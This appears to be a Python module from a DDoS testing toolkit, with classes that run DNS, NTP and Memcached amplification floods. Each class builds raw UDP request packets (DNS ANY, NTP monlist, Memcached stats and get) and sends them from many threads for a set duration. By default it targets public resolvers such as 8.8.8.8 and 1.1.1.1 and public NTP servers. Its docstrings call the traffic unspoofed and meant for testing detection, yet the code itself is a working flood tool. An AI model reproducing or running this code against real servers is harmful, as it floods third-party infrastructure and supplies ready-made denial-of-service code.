"""
Amplification DDoS Attacks
DNS, NTP, Memcached amplification attacks
"""

import socket
import struct
import time
import threading
from .base import AttackBase


class DNSAmplification(AttackBase):
    """
    DNS Amplification Attack
    
    Sends DNS ANY queries to open resolvers
    Amplification factor: up to 100x
    
    Note: This sends queries FROM your IP (not spoofed)
    For testing detection, not actual amplification
    """
    
    def execute(self, duration: int, resolvers: list = None, threads: int = 10, **kwargs) -> bool:
        """
        Execute DNS amplification test
        
        Args:
            duration: Attack duration in seconds
            resolvers: List of DNS resolver IPs (default: common open resolvers)
            threads: Number of concurrent threads
            
        Returns:
            True if successful
        """
        if resolvers is None:
            # Common open DNS resolvers (for testing only!)
            resolvers = [
                '8.8.8.8',      # Google
                '1.1.1.1',      # Cloudflare
                '208.67.222.222',  # OpenDNS
            ]
        
        self.log('ATTACK', f'🔴 Starting DNS AMPLIFICATION test')
        self.log('INFO', f'Duration: {duration}s | Resolvers: {len(resolvers)} | Threads: {threads}')
        self.log('WARNING', 'This is a TEST - queries sent from YOUR IP (not spoofed)')
        
        def build_dns_query(domain: str) -> bytes:
            """Build DNS ANY query packet"""
            # Transaction ID
            transaction_id = struct.pack('>H', 0x1234)
            
            # Flags: standard query
            flags = struct.pack('>H', 0x0100)
            
            # Questions: 1, Answers: 0, Authority: 0, Additional: 0
            qdcount = struct.pack('>H', 1)
            ancount = struct.pack('>H', 0)
            nscount = struct.pack('>H', 0)
            arcount = struct.pack('>H', 0)
            
            # Question section
            qname = b''
            for part in domain.split('.'):
                qname += struct.pack('B', len(part)) + part.encode()
            qname += b'\x00'
            
            # QTYPE: ANY (255), QCLASS: IN (1)
            qtype = struct.pack('>H', 255)  # ANY
            qclass = struct.pack('>H', 1)   # IN
            
            return transaction_id + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass
        
        def worker():
            """Thread worker"""
            end_time = time.time() + duration
            local_count = 0
            local_bytes = 0
            
            # Domains that typically have large DNS records
            domains = [
                'google.com',
                'facebook.com',
                'amazon.com',
                'microsoft.com',
            ]
            
            while time.time() < end_time and not self.stop_flag:
                for resolver in resolvers:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(1)
                        
                        domain = domains[local_count % len(domains)]
                        query = build_dns_query(domain)
                        
                        sock.sendto(query, (resolver, 53))
                        local_count += 1
                        local_bytes += len(query)
                        
                        # Try to receive response (to measure amplification)
                        try:
                            response, _ = sock.recvfrom(4096)
                            local_bytes += len(response)
                        except:
                            pass
                        
                        sock.close()
                        
                    except Exception:
                        pass
            
            self.stats['packets_sent'] += local_count
            self.stats['bytes_sent'] += local_bytes
        
        try:
            self.start()
            
            # Launch threads
            attack_threads = []
            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()
                attack_threads.append(t)
            
            time.sleep(duration)
            self.stop_flag = True
            
            for t in attack_threads:
                t.join(timeout=2)
            
            self.stop()
            self.log('SUCCESS', f'✓ DNS amplification test completed: {self.stats["packets_sent"]:,} queries')
            return True
            
        except Exception as e:
            self.log('ERROR', f'DNS amplification failed: {str(e)}')
            self.stop()
            return False


class NTPAmplification(AttackBase):
    """
    NTP Amplification Attack
    
    Sends NTP monlist commands to NTP servers
    Amplification factor: up to 556x
    
    Note: Most NTP servers have patched this vulnerability
    """
    
    def execute(self, duration: int, ntp_servers: list = None, threads: int = 10, **kwargs) -> bool:
        """
        Execute NTP amplification test
        
        Args:
            duration: Attack duration in seconds
            ntp_servers: List of NTP server IPs
            threads: Number of concurrent threads
            
        Returns:
            True if successful
        """
        if ntp_servers is None:
            # Example NTP servers (most are patched now)
            ntp_servers = [
                'pool.ntp.org',
                'time.google.com',
            ]
        
        self.log('ATTACK', f'🔴 Starting NTP AMPLIFICATION test')
        self.log('INFO', f'Duration: {duration}s | Servers: {len(ntp_servers)} | Threads: {threads}')
        self.log('WARNING', 'Most NTP servers are patched - this is for testing detection only')
        
        def build_ntp_monlist() -> bytes:
            """Build NTP monlist request"""
            # NTP monlist command (mode 7, private)
            return b'\x17\x00\x03\x2a' + b'\x00' * 4
        
        def worker():
            """Thread worker"""
            end_time = time.time() + duration
            local_count = 0
            
            while time.time() < end_time and not self.stop_flag:
                for server in ntp_servers:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(1)
                        
                        packet = build_ntp_monlist()
                        sock.sendto(packet, (server, 123))
                        local_count += 1
                        
                        sock.close()
                        
                    except Exception:
                        pass
            
            self.stats['packets_sent'] += local_count
        
        try:
            self.start()
            
            attack_threads = []
            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()
                attack_threads.append(t)
            
            time.sleep(duration)
            self.stop_flag = True
            
            for t in attack_threads:
                t.join(timeout=2)
            
            self.stop()
            self.log('SUCCESS', f'✓ NTP amplification test completed: {self.stats["packets_sent"]:,} requests')
            return True
            
        except Exception as e:
            self.log('ERROR', f'NTP amplification failed: {str(e)}')
            self.stop()
            return False


class MemcachedAmplification(AttackBase):
    """
    Memcached Amplification Attack
    
    Sends stats command to open Memcached servers
    Amplification factor: up to 51,000x (!)
    
    Note: This is one of the most dangerous amplification attacks
    """
    
    def execute(self, duration: int, servers: list = None, threads: int = 10, **kwargs) -> bool:
        """
        Execute Memcached amplification test
        
        Args:
            duration: Attack duration in seconds
            servers: List of Memcached server IPs
            threads: Number of concurrent threads
            
        Returns:
            True if successful
        """
        if servers is None:
            servers = []  # No default - need to provide your own test servers
        
        if not servers:
            self.log('WARNING', 'No Memcached servers provided - skipping')
            return False
        
        self.log('ATTACK', f'🔴 Starting MEMCACHED AMPLIFICATION test')
        self.log('INFO', f'Duration: {duration}s | Servers: {len(servers)} | Threads: {threads}')
        
        def worker():
            """Thread worker"""
            end_time = time.time() + duration
            local_count = 0
            
            # Memcached stats command
            commands = [
                b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',  # stats
                b'\x00\x00\x00\x00\x00\x01\x00\x00get key\r\n',  # get
            ]
            
            while time.time() < end_time and not self.stop_flag:
                for server in servers:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(1)
                        
                        cmd = commands[local_count % len(commands)]
                        sock.sendto(cmd, (server, 11211))
                        local_count += 1
                        
                        sock.close()
                        
                    except Exception:
                        pass
            
            self.stats['packets_sent'] += local_count
        
        try:
            self.start()
            
            attack_threads = []
            for _ in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()
                attack_threads.append(t)
            
            time.sleep(duration)
            self.stop_flag = True
            
            for t in attack_threads:
                t.join(timeout=2)
            
            self.stop()
            self.log('SUCCESS', f'✓ Memcached amplification test completed: {self.stats["packets_sent"]:,} requests')
            return True
            
        except Exception as e:
            self.log('ERROR', f'Memcached amplification failed: {str(e)}')
            self.stop()
            return False
